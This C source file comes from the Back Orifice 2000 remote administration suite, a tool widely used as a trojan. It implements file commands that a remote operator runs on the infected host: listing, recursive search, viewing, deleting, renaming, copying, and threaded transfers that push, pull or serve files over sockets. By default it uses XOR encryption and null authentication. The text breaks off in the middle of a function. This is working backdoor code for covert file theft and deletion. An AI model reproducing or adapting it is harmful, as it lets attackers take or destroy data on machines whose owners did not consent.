/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<commandloop.h>
#include<bocomreg.h>
#include<cmd\cmd_file.h>
#include<config.h>
#include<strhandle.h>

char g_svFileOptions[]="<**CFG**>File Transfer\0"
                       "S[8]:File Xfer Net Type=TCPIO\0\0\0\0"
                       "S[48]:File Xfer Bind Str=RANDOM\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
  					   "S[8]:File Xfer Encryption=XOR\0\0\0\0\0\0"
					   "S[8]:File Xfer Auth=NULLAUTH\0";
typedef enum {
	SEND,
	RECV,
	EMIT
} XFERTYPE;

typedef struct {
	char svName[256];
	char svPath[MAX_PATH+1];
	BOOL bActive;
	HANDLE htd;
	XFERTYPE nType;
	
} XFERFILEINFO;

XFERFILEINFO *g_pXferInfo=NULL;
int g_nXfers;
CRITICAL_SECTION g_csXfer;

#define MAX_XFERS 32

typedef struct {
	HANDLE hFile;
	CAuthSocket *fas;
	BOOL *pbActive;
} XFERFILEARGS;



int CmdProc_DirectoryList(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];

	// Set directory wildcard spec if one doesn't exist
	char svPath[MAX_PATH+1];
	lstrcpyn(svPath,svArg2,MAX_PATH-1);
	if(svPath[lstrlen(svPath)-1]=='\\')
		lstrcat(svPath, "*");
	
	// Start file enumeration
	HANDLE hFind;
	WIN32_FIND_DATA finddata;

	hFind=FindFirstFile(svPath, &finddata);
	if(hFind==INVALID_HANDLE_VALUE) {
		IssueAuthCommandReply(cas_from,comid,1,"Unable to enumerate files.\n");
		return 1;
	}
	wsprintf(svBuffer,"Contents of directory '%s':\n", svArg2 );
	IssueAuthCommandReply(cas_from,comid,1,svBuffer);
	
	// Enumerate files
	int nCount;
	DWORD dwBytes;
	nCount=0;
	dwBytes=0;
	do {
		char svAttribs[8];
		FILETIME filetime;
		SYSTEMTIME systemtime;

		lstrcpy(svAttribs,"-------");
		if(finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)  svAttribs[0] = 'D';
		if(finddata.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)    svAttribs[1] = 'A';
		if(finddata.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)     svAttribs[2] = 'H';
		if(finddata.dwFileAttributes & FILE_ATTRIBUTE_COMPRESSED) svAttribs[3] = 'C';
		if(finddata.dwFileAttributes & FILE_ATTRIBUTE_READONLY)   svAttribs[4] = 'R';
		if(finddata.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)     svAttribs[5] = 'S';
		if(finddata.dwFileAttributes & FILE_ATTRIBUTE_TEMPORARY)  svAttribs[6] = 'T';
		
		FileTimeToLocalFileTime(&finddata.ftLastWriteTime, &filetime);
		FileTimeToSystemTime(&filetime, &systemtime);
		wsprintf(svBuffer,"%12s  %8d %7s %2.2d-%2.2d-%4.4d %2.2d:%2.2d %.260s\n", finddata.cAlternateFileName, finddata.nFileSizeLow, svAttribs, (int)systemtime.wMonth, (int)systemtime.wDay, (int)systemtime.wYear, (int)systemtime.wHour%24, (int)systemtime.wMinute%60, finddata.cFileName );
		IssueAuthCommandReply(cas_from,comid,1,svBuffer);

		nCount++;
		dwBytes+=finddata.nFileSizeLow;
	} while(FindNextFile(hFind, &finddata));

	// Close enumeration
	FindClose(hFind);
	wsprintf(svBuffer, "%lu bytes in %ld files.\n", dwBytes, nCount);
	IssueAuthCommandReply(cas_from,comid,0,svBuffer);	
	
	return 0;
}

int FindFile(CAuthSocket *cas_from, int comid, char *svRoot, char *svSpec, char *svBuffer)
{
	char svPath[MAX_PATH+1];
	
	// Set directory wildcard spec if one doesn't exist
	lstrcpyn(svPath,svRoot,MAX_PATH-1);
	if(svPath[lstrlen(svPath)-1]=='\\')
		lstrcpyn(svPath+lstrlen(svPath), svSpec, MAX_PATH-1-lstrlen(svPath));
	else {
		lstrcat(svPath,"\\");
		lstrcpyn(svPath+lstrlen(svPath), svSpec, MAX_PATH-lstrlen(svPath));
	}
	
	// Start file enumeration
	HANDLE hFind;
	WIN32_FIND_DATA finddata;

	int nCount;
	nCount=0;
	hFind=FindFirstFile(svPath, &finddata);
	if(hFind!=INVALID_HANDLE_VALUE) {
		wsprintf(svBuffer,"Matched files in directory '%s':\n", svRoot );
		IssueAuthCommandReply(cas_from,comid,1,svBuffer);
		
		// Enumerate files
		do {
			char svAttribs[8];
			FILETIME filetime;
			SYSTEMTIME systemtime;
			
			lstrcpy(svAttribs,"-------");
			if(finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)  svAttribs[0] = 'D';
			if(finddata.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)    svAttribs[1] = 'A';
			if(finddata.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)     svAttribs[2] = 'H';
			if(finddata.dwFileAttributes & FILE_ATTRIBUTE_COMPRESSED) svAttribs[3] = 'C';
			if(finddata.dwFileAttributes & FILE_ATTRIBUTE_READONLY)   svAttribs[4] = 'R';
			if(finddata.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)     svAttribs[5] = 'S';
			if(finddata.dwFileAttributes & FILE_ATTRIBUTE_TEMPORARY)  svAttribs[6] = 'T';
			
			FileTimeToLocalFileTime(&finddata.ftCreationTime, &filetime);
			FileTimeToSystemTime(&filetime, &systemtime);
			wsprintf(svBuffer,"%12s  %8d %7s %02d-%02d-%02d %02d:%02d %.260s\n", finddata.cAlternateFileName, finddata.nFileSizeLow, svAttribs, (int)systemtime.wMonth, (int)systemtime.wDay, (int)systemtime.wYear%100, (int)systemtime.wHour, (int)systemtime.wMinute, finddata.cFileName );
			IssueAuthCommandReply(cas_from,comid,1,svBuffer);
			
			nCount++;
		} while(FindNextFile(hFind, &finddata));
		
		// Close enumeration
		FindClose(hFind);
	}

	
	// Recurse
	lstrcpyn(svPath,svRoot,MAX_PATH-1);
	if(svPath[lstrlen(svPath)-1]=='\\')
		lstrcpyn(svPath+lstrlen(svPath), "*", MAX_PATH-lstrlen(svPath));
	else {
		lstrcpyn(svPath+lstrlen(svPath), "\\*", MAX_PATH-lstrlen(svPath));
	}
	
	hFind=FindFirstFile(svPath, &finddata);
	if(hFind==INVALID_HANDLE_VALUE) {
		return nCount;
	}
	do {
		if((lstrcmp(finddata.cFileName,".")==0) ||
		   (lstrcmp(finddata.cFileName,"..")==0)) continue;
		if(finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			char svNewRoot[MAX_PATH+1];
			lstrcpyn(svNewRoot,svRoot,MAX_PATH-1);
			if(svNewRoot[lstrlen(svNewRoot)-1]=='\\')
				lstrcpyn(svNewRoot+lstrlen(svNewRoot), finddata.cFileName, MAX_PATH-1-lstrlen(svNewRoot));
			else {
				lstrcat(svNewRoot,"\\");
				lstrcpyn(svNewRoot+lstrlen(svNewRoot), finddata.cFileName, MAX_PATH-lstrlen(svNewRoot));
			}
			nCount+=FindFile(cas_from,comid,svNewRoot,svSpec,svBuffer);
		}
	} while(FindNextFile(hFind, &finddata));

	// Close enumeration
	FindClose(hFind);

	return nCount;
}

int CmdProc_FileFind(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	int nCount;

	nCount=FindFile(cas_from,comid,svArg2,svArg3,svBuffer);
	wsprintf(svBuffer,"%d matches found.\n",nCount);
	IssueAuthCommandReply(cas_from,comid,0,svBuffer);

	return 0;
}

int CmdProc_FileDelete(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(DeleteFile(svArg2)==0) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not delete file.\n");
		return 1;
	}

	IssueAuthCommandReply(cas_from,comid,0,"File deleted.\n");
	return 0;
}

int CmdProc_FileView(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	HANDLE hFile;
	hFile=CreateFile(svArg2,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
	if(hFile==INVALID_HANDLE_VALUE) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not open file.\n");
		return 1;
	}

	// Spit out lines to io socket
	char *pData;
	char *svLine;
	DWORD dwLen,dwBytes;
	pData=(char *) malloc(4097);
	svLine=(char *) malloc(4097);

	if(pData==NULL || svLine==NULL) {
		if(pData!=NULL) free(pData);
		if(svLine!=NULL) free(svLine);
		IssueAuthCommandReply(cas_from,comid,0,"Error allocating memory.\n");
		return 1;
	}
	
	dwLen=4096;
	do {
		ReadFile(hFile,pData,dwLen,&dwBytes,NULL);
		pData[dwBytes]='\0';
		IssueAuthCommandReply(cas_from,comid,1,pData);
	} while(dwLen==dwBytes);
	IssueAuthCommandReply(cas_from,comid,0,"\n<<EOF>>\n");

	free(pData);
	free(svLine);

	CloseHandle(hFile);
	
	return 0;
}

int CmdProc_FileRename(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(GetFileAttributes(svArg2)&FILE_ATTRIBUTE_DIRECTORY) {
		char svSrc[260];
		lstrcpyn(svSrc,svArg2,259);
		svSrc[lstrlen(svSrc)+1]='\0';
		
		char svDst[260];
		lstrcpyn(svDst,svArg3,259);
		svDst[lstrlen(svDst)+1]='\0';
		
		SHFILEOPSTRUCT shfos;
		memset(&shfos,0,sizeof(SHFILEOPSTRUCT));
		shfos.hwnd=NULL;
		shfos.wFunc=FO_MOVE;
		shfos.pFrom=svSrc;
		shfos.pTo=svDst;
		shfos.fFlags=FOF_NOCONFIRMATION|FOF_NOCONFIRMMKDIR|FOF_NOERRORUI|FOF_RENAMEONCOLLISION|FOF_SILENT;
	
		if(SHFileOperation(&shfos)!=0) {
			IssueAuthCommandReply(cas_from,comid,0,"Could not move/rename directory.\n");
			return 1;
		}
	} else {
		if(MoveFile(svArg2,svArg3)==0) {
			IssueAuthCommandReply(cas_from,comid,0,"Could not move/rename file.\n");
			return 1;
		}
	}

	IssueAuthCommandReply(cas_from,comid,0,"File moved/renamed.\n");
	return 0;
}

int CmdProc_FileCopy(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(GetFileAttributes(svArg2)&FILE_ATTRIBUTE_DIRECTORY) {
		char svSrc[260];
		lstrcpyn(svSrc,svArg2,259);
		svSrc[lstrlen(svSrc)+1]='\0';
		
		char svDst[260];
		lstrcpyn(svDst,svArg3,259);
		svDst[lstrlen(svDst)+1]='\0';
		
		SHFILEOPSTRUCT shfos;
		memset(&shfos,0,sizeof(SHFILEOPSTRUCT));
		shfos.hwnd=NULL;
		shfos.wFunc=FO_COPY;
		shfos.pFrom=svSrc;
		shfos.pTo=svDst;
		shfos.fFlags=FOF_NOCONFIRMATION|FOF_NOCONFIRMMKDIR|FOF_NOERRORUI|FOF_RENAMEONCOLLISION|FOF_SILENT;
	
		if(SHFileOperation(&shfos)!=0) {
			IssueAuthCommandReply(cas_from,comid,0,"Could not copy directory.\n");
			return 1;
		}
	} else {
		if(CopyFile(svArg2,svArg3,FALSE)==0) {
			IssueAuthCommandReply(cas_from,comid,0,"Could not copy file.\n");
			return 1;
		}
	}

	IssueAuthCommandReply(cas_from,comid,0,"File copied.\n");
	
	return 0;
}

int CmdProc_DirectoryMake(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(CreateDirectory(svArg2,NULL)==0) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not create directory.\n");
		return 1;
	}

	IssueAuthCommandReply(cas_from,comid,0,"Directory created.\n");
	
	return 0;
}

int CmdProc_DirectoryDelete(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(GetFileAttributes(svArg2)&FILE_ATTRIBUTE_DIRECTORY) {
		char svSrc[260];
		lstrcpyn(svSrc,svArg2,259);
		svSrc[lstrlen(svSrc)+1]='\0';
		
		SHFILEOPSTRUCT shfos;
		memset(&shfos,0,sizeof(SHFILEOPSTRUCT));
		shfos.hwnd=GetDesktopWindow();
		shfos.wFunc=FO_DELETE;
		shfos.pFrom=svSrc;
		shfos.fFlags=FOF_NOCONFIRMATION|FOF_NOCONFIRMMKDIR|FOF_NOERRORUI|FOF_RENAMEONCOLLISION|FOF_SILENT;
		
		if(SHFileOperation(&shfos)!=0) {
			IssueAuthCommandReply(cas_from,comid,0,"Could not delete directory.\n");
			return 1;
		}
	} else {
		IssueAuthCommandReply(cas_from,comid,0,"Could not delete. Not a directory.\n");
		return 1;
	}

	IssueAuthCommandReply(cas_from,comid,0,"Directory removed.\n");
	
	return 0;
}



int Cmd_FileXfer_Init(void)
{
	InitializeCriticalSection(&g_csXfer);
	g_nXfers=0;
	g_pXferInfo=(XFERFILEINFO *)malloc(sizeof(XFERFILEINFO)*MAX_XFERS);
	return 0;
}

int Cmd_FileXfer_Kill(void)
{
	DeleteCriticalSection(&g_csXfer);
	int i;
	for(i=0;i<g_nXfers;i++) {
		g_pXferInfo[i].bActive=FALSE;
		WaitForSingleObject(g_pXferInfo[i].htd,5000);
	}
	g_nXfers=0;
	free(g_pXferInfo);
	return 0;
}

DWORD WINAPI RecvFileThread(LPVOID lpArgs)
{
	HANDLE hFile=((XFERFILEARGS *)lpArgs)->hFile;
	CAuthSocket *fas=((XFERFILEARGS *)lpArgs)->fas;
	BOOL *pbActive=((XFERFILEARGS *)lpArgs)->pbActive;
	free(lpArgs);
	
	// Receive file
	
	CAuthSocket *child=NULL;
	while(*pbActive) {
		// Accept only one connection
		child=fas->Accept();
		if(child!=NULL) {
			break;
		}
		Sleep(0);
	}
	if(child) {
		int ret,len,count;
		BYTE *data;
		
		// Get transfer length
		while((ret=child->Recv(&data,&len))==0);
		if(ret>0) {		
			count=*(int *)data;
			// Transfer file
			while((*pbActive) && count>0) {
				ret=child->Recv(&data,&len);
				if(ret>0) {
					DWORD written;
					WriteFile(hFile,data,len,&written,NULL);
					fas->Free(data);
					if(written!=(DWORD)len) {
						*pbActive=FALSE;
					}
					count-=len;
				} else if(ret==0) {
					Sleep(20);
				} else {
					*pbActive=FALSE;
				}
			}
		}
		// close socket
		child->Close();
		delete child;
	}

	fas->Close();
	delete fas;

	// close file
	CloseHandle(hFile);
	
	// Remove self from xfer list
	EnterCriticalSection(&g_csXfer);
	int i;
	for(i=0;i<g_nXfers;i++) {
		if(pbActive==&(g_pXferInfo[i].bActive)) {
			if(i<(g_nXfers-1)) {
				memcpy(g_pXferInfo+i,g_pXferInfo+i+1,g_nXfers-(i+1));
			}
			g_nXfers--;
			break;
		}
	}
	LeaveCriticalSection(&g_csXfer);
	
	return 0;
}

int CmdProc_ReceiveFile(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char *svEnc=NULL,*svAuth=NULL,*svNetMod=NULL,*svBindStr=NULL,*svParam=NULL;

	// Check if already started
	EnterCriticalSection(&g_csXfer);
	if(g_nXfers>=MAX_XFERS) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not receive. Too many transfers started.\n");
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	// Get parameters
	svBindStr=GetCfgStr(g_svFileOptions,"File Xfer Bind Str");
	svNetMod=GetCfgStr(g_svFileOptions,"File Xfer Net Type");
	svEnc=GetCfgStr(g_svFileOptions,"File Xfer Encryption");
	svAuth=GetCfgStr(g_svFileOptions,"File Xfer Auth");

	if((svParam=svArg2)!=NULL) {
		if(svParam[0]!='\0') svBindStr=svParam;	
		if((svParam=BreakString(svBindStr,","))!=NULL) {
			if(svParam[0]!='\0') svNetMod=svParam;
			if((svParam=BreakString(svNetMod,","))!=NULL) {
				if(svParam[0]!='\0') svEnc=svParam;
				if((svParam=BreakString(svEnc,","))!=NULL) {
					if(svParam[0]!='\0') svAuth=svParam;
				}
			}
		}
	}
	if(svBindStr[0]=='\0') {
		svBindStr="RANDOM";
	}
	char svShortNetMod[16],svShortEnc[16],svShortAuth[16];
	if(svNetMod[0]=='\0') {
		svNetMod=cas_from->m_pIOH->pQuery();
	}
	lstrcpyn(svShortNetMod,svNetMod,16);
	BreakString(svShortNetMod,":");
	if(svEnc[0]=='\0') {
		svEnc=cas_from->m_pEE->pQuery();
	}
	lstrcpyn(svShortEnc,svEnc,16);
	BreakString(svShortEnc,":");
	if(svAuth[0]=='\0') {
		svAuth=cas_from->GetAuthHandler()->pQuery();
	}
	lstrcpyn(svShortAuth,svAuth,16);
	BreakString(svShortAuth,":");

	if(svArg3==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not open. Must supply filename.\n");
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	CAuthSocket *fas=ListenAuthSocket(NULL,cas_from->GetUserID(),NULL,svBindStr,svNetMod,svEnc,svAuth);
	if(fas==NULL || fas==(CAuthSocket *)0xFFFFFFFF) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not start listen socket\n");
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	HANDLE hFile=CreateFile(svArg3,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not create file.\n");
		fas->Close();
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	// Create transfer thread
	XFERFILEARGS *pArgs=(XFERFILEARGS *)malloc(sizeof(XFERFILEARGS));
	pArgs->hFile=hFile;
	pArgs->fas=fas;
	pArgs->pbActive=&(g_pXferInfo[g_nXfers].bActive);

	DWORD tid;
	HANDLE htd=CreateThread(NULL,0,RecvFileThread,pArgs,CREATE_SUSPENDED,&tid);
	if(htd==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not create thread.\n");
		CloseHandle(hFile);
		fas->Close();
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	// Add transfer to table
	fas->GetConnectAddr(g_pXferInfo[g_nXfers].svName,256);
	lstrcpyn(g_pXferInfo[g_nXfers].svPath,svArg3,MAX_PATH);
	g_pXferInfo[g_nXfers].bActive=TRUE;
	g_pXferInfo[g_nXfers].nType=RECV;
	g_pXferInfo[g_nXfers].htd=htd;
	g_nXfers++;	
	LeaveCriticalSection(&g_csXfer);		

	char svMsg[512];
	wsprintf(svMsg, "File recv started on: %.256s,%.16s,%.16s,%.16s\n",
		g_pXferInfo[g_nXfers-1].svName,
		svShortNetMod,
		svShortEnc,
		svShortAuth);
	IssueAuthCommandReply(cas_from,comid,0,svMsg);
	ResumeThread(htd);
	return 0;
}

DWORD WINAPI SendFileThread(LPVOID lpArgs)
{
	HANDLE hFile=((XFERFILEARGS *)lpArgs)->hFile;
	CAuthSocket *fas=((XFERFILEARGS *)lpArgs)->fas;
	BOOL *pbActive=((XFERFILEARGS *)lpArgs)->pbActive;
	free(lpArgs);
	
	// Send file
	
	int ret,count;
	DWORD dwLength=GetFileSize(hFile,NULL);
		
	ret=fas->Send((BYTE*)&dwLength,sizeof(DWORD));
	if(ret>0) {
		count=dwLength;
		while(count>0 && (*pbActive)) {
			BYTE buf[1400];
			DWORD dwBytes;
			ReadFile(hFile,buf,1400,&dwBytes,NULL);
			if(dwBytes>0) {
				fas->Send(buf,(int)dwBytes);
				count-=(int)dwBytes;
			}
		}
		*pbActive=FALSE;
	}	
	fas->Close();
	delete fas;

	CloseHandle(hFile);

	// Remove self from xfer list
	EnterCriticalSection(&g_csXfer);
	int i;
	for(i=0;i<g_nXfers;i++) {
		if(pbActive==&(g_pXferInfo[i].bActive)) {
			if(i<(g_nXfers-1)) {
				memcpy(g_pXferInfo+i,g_pXferInfo+i+1,g_nXfers-(i+1));
			}
			g_nXfers--;
			break;
		}
	}
	LeaveCriticalSection(&g_csXfer);
	
	return 0;
}

int CmdProc_SendFile(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char *svEnc=NULL,*svAuth=NULL,*svNetMod=NULL,*svAddress=NULL,*svParam=NULL;

	// Check if already started
	EnterCriticalSection(&g_csXfer);
	if(g_nXfers>=MAX_XFERS) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not send. Too many transfers started.\n");
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	// Get parameters

	svAddress=GetCfgStr(g_svFileOptions,"File Xfer Bind Str");
	svNetMod=GetCfgStr(g_svFileOptions,"File Xfer Net Type");
	svEnc=GetCfgStr(g_svFileOptions,"File Xfer Encryption");
	svAuth=GetCfgStr(g_svFileOptions,"File Xfer Auth");

	if((svParam=svArg2)!=NULL) {
		if(svParam[0]!='\0') svAddress=svParam;	
		if((svParam=BreakString(svAddress,","))!=NULL) {
			if(svParam[0]!='\0') svNetMod=svParam;
			if((svParam=BreakString(svNetMod,","))!=NULL) {
				if(svParam[0]!='\0') svEnc=svParam;
				if((svParam=BreakString(svEnc,","))!=NULL) {
					if(svParam[0]!='\0') svAuth=svParam;
				}
			}
		}
	}
	char svShortNetMod[16],svShortEnc[16],svShortAuth[16];
	if(svNetMod[0]=='\0') {
		svNetMod=cas_from->m_pIOH->pQuery();
	}
	lstrcpyn(svShortNetMod,svNetMod,16);
	BreakString(svShortNetMod,":");
	if(svEnc[0]=='\0') {
		svEnc=cas_from->m_pEE->pQuery();
	}
	lstrcpyn(svShortEnc,svEnc,16);
	BreakString(svShortEnc,":");
	if(svAuth[0]=='\0') {
		svAuth=cas_from->GetAuthHandler()->pQuery();
	}
	lstrcpyn(svShortAuth,svAuth,16);
	BreakString(svShortAuth,":");

	if(svArg3==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not open. Must supply local filename.\n");
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	CAuthSocket *fas=ConnectAuthSocket(NULL,cas_from->GetUserID(),NULL,svAddress,svNetMod,svEnc,svAuth);
	if(fas==NULL || fas==(CAuthSocket *)0xFFFFFFFF) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not connect to address.\n");
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	HANDLE hFile=CreateFile(svArg3,GENERIC_READ,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not open local file.\n");
		fas->Close();
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	// Create transfer thread
	XFERFILEARGS *pArgs=(XFERFILEARGS *)malloc(sizeof(XFERFILEARGS));
	pArgs->hFile=hFile;
	pArgs->fas=fas;
	pArgs->pbActive=&(g_pXferInfo[g_nXfers].bActive);

	DWORD tid;
	HANDLE htd=CreateThread(NULL,0,SendFileThread,pArgs,CREATE_SUSPENDED,&tid);
	if(htd==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not create thread.\n");
		CloseHandle(hFile);
		fas->Close();
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	// Add transfer to table
	fas->GetRemoteAddr(g_pXferInfo[g_nXfers].svName,256);
	lstrcpyn(g_pXferInfo[g_nXfers].svPath,svArg3,MAX_PATH);
	g_pXferInfo[g_nXfers].bActive=TRUE;
	g_pXferInfo[g_nXfers].nType=SEND;
	g_pXferInfo[g_nXfers].htd=htd;
	g_nXfers++;	
	LeaveCriticalSection(&g_csXfer);		

	char svMsg[512];
	wsprintf(svMsg, "File send started to: %.256s,%.16s,%.16s,%.16s\n",
		g_pXferInfo[g_nXfers-1].svName,
		svShortNetMod,
		svShortEnc,
		svShortAuth);

	IssueAuthCommandReply(cas_from,comid,0,svMsg);

	ResumeThread(htd);
	return 0;
}


DWORD WINAPI EmitFileThread(LPVOID lpArgs)
{
	HANDLE hFile=((XFERFILEARGS *)lpArgs)->hFile;
	CAuthSocket *fas=((XFERFILEARGS *)lpArgs)->fas;
	BOOL *pbActive=((XFERFILEARGS *)lpArgs)->pbActive;
	free(lpArgs);
	
	// Receive file
	
	CAuthSocket *child=NULL;
	while(*pbActive) {
		// Accept only one connection
		child=fas->Accept();
		if(child!=NULL) {
			break;
		}
		Sleep(0);
	}
	if(child) {
		int ret,count;
		DWORD dwLength=GetFileSize(hFile,NULL);
		
		while((ret=child->Send((BYTE*)&dwLength,sizeof(DWORD)))==0) Sleep(20);
		if(ret>0) {
			count=dwLength;
			while(count>0 && (*pbActive)) {
				BYTE buf[4096],*pbuf;
				DWORD dwBytes;
				ReadFile(hFile,buf,4096,&dwBytes,NULL);
				pbuf=buf;
				if(dwBytes>0) {
					while((ret=child->Send(buf,(int)dwBytes))==0) Sleep(20);
					if(ret<0) *pbActive=FALSE;
					count-=(int)dwBytes;
				}
			}
			*pbActive=FALSE;
		}	
				
		// close socket
		child->Close();
		delete child;
	}

	fas->Close();
	delete fas;

	// close file
	CloseHandle(hFile);
	
	// Remove self from xfer list
	EnterCriticalSection(&g_csXfer);
	int i;
	for(i=0;i<g_nXfers;i++) {
		if(pbActive==&(g_pXferInfo[i].bActive)) {
			if(i<(g_nXfers-1)) {
				memcpy(g_pXferInfo+i,g_pXferInfo+i+1,g_nXfers-(i+1));
			}
			g_nXfers--;
			break;
		}
	}
	LeaveCriticalSection(&g_csXfer);
	
	return 0;
}

int CmdProc_EmitFile(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char *svEnc=NULL,*svAuth=NULL,*svNetMod=NULL,*svBindStr=NULL,*svParam=NULL;

	// Check if already started
	EnterCriticalSection(&g_csXfer);
	if(g_nXfers>=MAX_XFERS) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not emit. Too many transfers started.\n");
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	// Get parameters

	svBindStr=GetCfgStr(g_svFileOptions,"File Xfer Bind Str");
	svNetMod=GetCfgStr(g_svFileOptions,"File Xfer Net Type");
	svEnc=GetCfgStr(g_svFileOptions,"File Xfer Encryption");
	svAuth=GetCfgStr(g_svFileOptions,"File Xfer Auth");

	if((svParam=svArg2)!=NULL) {
		if(svParam[0]!='\0') svBindStr=svParam;	
		if((svParam=BreakString(svBindStr,","))!=NULL) {
			if(svParam[0]!='\0') svNetMod=svParam;
			if((svParam=BreakString(svNetMod,","))!=NULL) {
				if(svParam[0]!='\0') svEnc=svParam;
				if((svParam=BreakString(svEnc,","))!=NULL) {
					if(svParam[0]!='\0') svAuth=svParam;
				}
			}
		}
	}
	if(svBindStr[0]=='\0') {
		svBindStr="RANDOM";
	}
	char svShortNetMod[16],svShortEnc[16],svShortAuth[16];
	if(svNetMod[0]=='\0') {
		svNetMod=cas_from->m_pIOH->pQuery();
	}
	lstrcpyn(svShortNetMod,svNetMod,16);
	BreakString(svShortNetMod,":");
	if(svEnc[0]=='\0') {
		svEnc=cas_from->m_pEE->pQuery();
	}
	lstrcpyn(svShortEnc,svEnc,16);
	BreakString(svShortEnc,":");
	if(svAuth[0]=='\0') {
		svAuth=cas_from->GetAuthHandler()->pQuery();
	}
	lstrcpyn(svShortAuth,svAuth,16);
	BreakString(svShortAuth,":");
	if(svArg3==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not open. Must supply local filename.\n");
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	CAuthSocket *fas=ListenAuthSocket(NULL,cas_from->GetUserID(),NULL,svBindStr,svNetMod,svEnc,svAuth);
	if(fas==NULL || fas==(CAuthSocket *)0xFFFFFFFF) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not bind socket.\n");
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	HANDLE hFile=CreateFile(svArg3,GENERIC_READ,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not open local file.\n");
		fas->Close();
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	// Create transfer thread
	XFERFILEARGS *pArgs=(XFERFILEARGS *)malloc(sizeof(XFERFILEARGS));
	pArgs->hFile=hFile;
	pArgs->fas=fas;
	pArgs->pbActive=&(g_pXferInfo[g_nXfers].bActive);

	DWORD tid;
	HANDLE htd=CreateThread(NULL,0,EmitFileThread,pArgs,CREATE_SUSPENDED,&tid);
	if(htd==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not create thread.\n");
		CloseHandle(hFile);
		fas->Close();
		LeaveCriticalSection(&g_csXfer);
		return -1;
	}

	// Add transfer to table
	fas->GetConnectAddr(g_pXferInfo[g_nXfers].svName,256);
	lstrcpyn(g_pXferInfo[g_nXfers].svPath,svArg3,MAX_PATH);
	g_pXferInfo[g_nXfers].bActive=TRUE;
	g_pXferInfo[g_nXfers].nType=EMIT;
	g_pXferInfo[g_nXfers].htd=htd;
	g_nXfers++;	
	LeaveCriticalSection(&g_csXfer);		

	char svMsg[512];
	wsprintf(svMsg, "File emit started from: %.256s,%.16s,%.16s,%.16s\n",
		g_pXferInfo[g_nXfers-1].svName,
		svShortNetMod,
		svShortEnc,
		svShortAuth);
